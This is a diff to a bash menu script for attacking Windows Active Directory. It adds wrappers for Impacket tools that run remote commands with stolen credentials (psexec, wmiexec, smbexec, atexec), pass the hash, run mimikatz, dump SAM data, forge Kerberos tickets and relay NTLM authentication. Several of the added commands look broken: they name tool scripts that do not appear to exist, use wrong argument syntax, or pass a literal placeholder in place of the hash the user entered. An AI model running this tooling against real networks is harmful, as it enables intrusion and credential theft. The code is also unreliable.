@@ -1895,7 +1895,7 @@ show_ad_tools() {
         echo -e "1) BloodHound"
         echo -e "2) ldapsearch"
         echo -e "3) enum4linux"
-        echo -e "4) Impacket"
+        echo -e "4) Impacket Tools"
         echo -e "5) CrackMapExec"
         echo -e "6) SMB Enumeration"
         echo -e "7) Kerberos Enumeration"
@@ -1957,6 +1957,23 @@ run_impacket() {
     echo -e "3) SecretsDump"
     echo -e "4) SMBClient"
     echo -e "5) Pass the Hash"
+    echo -e "6) WMIExec"
+    echo -e "7) PSExec"
+    echo -e "8) DCERPCDump"
+    echo -e "9) Mimikatz"
+    echo -e "10) DCOMExec"
+    echo -e "11) AtExec"
+    echo -e "12) SMBExec"
+    echo -e "13) RDP (WMIExec)"
+    echo -e "14) NetView"
+    echo -e "15) SAMDump"
+    echo -e "16) Ticket Converter (TicketConverter)"
+    echo -e "17) Ticket Renewal (Ticketer)"
+    echo -e "18) PrinterBug"
+    echo -e "19) RaiseChild"
+    echo -e "20) Lookupsid"
+    echo -e "21) Rpcdump"
+    echo -e "22) Smbrelayx"
     read -e -p "Select an Impacket tool: " impacket_option
 
     case $impacket_option in
@@ -1992,6 +2009,106 @@ run_impacket() {
             read -e -p "Enter username: " username
             read -s -p "Enter hash: " hash
             python3 /usr/share/doc/python3-impacket/examples/wmiexec.py $domain/$username@$target_ip -hashes lmhash:nthash
+            ;;
+	6)
+            read -e -p "Enter target IP: " target_ip
+            read -e -p "Enter domain name: " domain
+            read -e -p "Enter username: " username
+            read -s -p "Enter password: " password
+            python3 /usr/share/doc/python3-impacket/examples/wmiexec.py $domain/$username:$password@$target_ip
+            ;;
+        7)
+            read -e -p "Enter target IP: " target_ip
+            read -e -p "Enter domain name: " domain
+            read -e -p "Enter username: " username
+            read -s -p "Enter password: " password
+            python3 /usr/share/doc/python3-impacket/examples/psexec.py $domain/$username:$password@$target_ip
+            ;;
+        8)
+            read -e -p "Enter target IP: " target_ip
+            read -e -p "Enter domain name: " domain
+            read -e -p "Enter username: " username
+            read -s -p "Enter password: " password
+            python3 /usr/share/doc/python3-impacket/examples/dcerpcdump.py $domain/$username:$password@$target_ip
+            ;;
+        9)
+            read -e -p "Enter target IP: " target_ip
+            read -e -p "Enter domain name: " domain
+            read -e -p "Enter username: " username
+            read -s -p "Enter password: " password
+            python3 /usr/share/doc/python3-impacket/examples/mimikatz.py $domain/$username:$password@$target_ip
+            ;;
+        10)
+            read -e -p "Enter target IP: " target_ip
+            read -e -p "Enter domain name: " domain
+            read -e -p "Enter username: " username
+            read -s -p "Enter password: " password
+            python3 /usr/share/doc/python3-impacket/examples/dcomexec.py $domain/$username:$password@$target_ip
+            ;;
+        11)
+            read -e -p "Enter target IP: " target_ip
+            read -e -p "Enter domain name: " domain
+            read -e -p "Enter username: " username
+            read -s -p "Enter password: " password
+            python3 /usr/share/doc/python3-impacket/examples/atexec.py $domain/$username:$password@$target_ip
+            ;;
+	12)
+            read -e -p "Enter target IP: " target_ip
+            read -e -p "Enter domain name: " domain
+            read -e -p "Enter username: " username
+            read -s -p "Enter password: " password
+            python3 /usr/share/doc/python3-impacket/examples/smbexec.py $domain/$username:$password@$target_ip
+            ;;
+        13)
+            read -e -p "Enter target IP: " target_ip
+            read -e -p "Enter domain name: " domain
+            read -e -p "Enter username: " username
+            read -s -p "Enter password: " password
+            python3 /usr/share/doc/python3-impacket/examples/rdpclient.py $domain/$username:$password@$target_ip
+            ;;
+        14)
+            read -e -p "Enter target IP: " target_ip
+            python3 /usr/share/doc/python3-impacket/examples/netview.py $target_ip
+            ;;
+        15)
+            read -e -p "Enter target IP: " target_ip
+            python3 /usr/share/doc/python3-impacket/examples/samrdump.py $target_ip
+            ;;
+        16)
+            read -e -p "Enter target IP: " target_ip
+            read -e -p "Enter ticket file: " ticket_file
+            python3 /usr/share/doc/python3-impacket/examples/ticketConverter.py $ticket_file
+            ;;
+        17)
+            read -e -p "Enter domain name: " domain
+            read -e -p "Enter username: " username
+            python3 /usr/share/doc/python3-impacket/examples/ticketer.py -nthash -domain $domain -user $username
+            ;;
+        18)
+            read -e -p "Enter target IP: " target_ip
+            read -e -p "Enter domain name: " domain
+            read -e -p "Enter username: " username
+            python3 /usr/share/doc/python3-impacket/examples/printerbug.py $domain/$username@$target_ip
+            ;;
+        19)
+            read -e -p "Enter target IP: " target_ip
+            read -e -p "Enter command to execute: " command
+            python3 /usr/share/doc/python3-impacket/examples/raiseChild.py $target_ip $command
+            ;;
+        20)
+            read -e -p "Enter target IP: " target_ip
+            python3 /usr/share/doc/python3-impacket/examples/lookupsid.py $target_ip
+            ;;
+        21)
+            read -e -p "Enter target IP: " target_ip
+            python3 /usr/share/doc/python3-impacket/examples/rpcdump.py $target_ip
+            ;;
+        22)
+            read -e -p "Enter target IP: " target_ip
+            read -e -p "Enter domain name: " domain
+            read -e -p "Enter username: " username
+            read -s -p "Enter password: " password
+            python3 /usr/share/doc/python3-impacket/examples/smbrelayx.py -h $domain/$username:$password@$target_ip
             ;;
         *)
             echo -e "${RED}Invalid option. Please try again.${NC}"
@@ -2031,7 +2148,7 @@ dns_enumeration() {
 asrep_roasting() {
     read -e -p "Enter domain: " domain
     echo -e "${BLUE}[+] Running AS-REP Roasting...${NC}"
-    GetNPUsers.py -dc-ip $target_ip -no-pass $domain/
+    python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip $target_ip -no-pass $domain/
 }
 
 # Function for Password Spraying
@@ -2048,7 +2165,7 @@ password_spraying() {
 smb_relay() {
     read -e -p "Enter target IP: " target_ip
     echo -e "${BLUE}[+] Running SMB Relay Attack...${NC}"
-    ntlmrelayx.py -smb2support -t $target_ip
+    python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -smb2support -t $target_ip
 }
 
 # Function for LDAP Enumeration
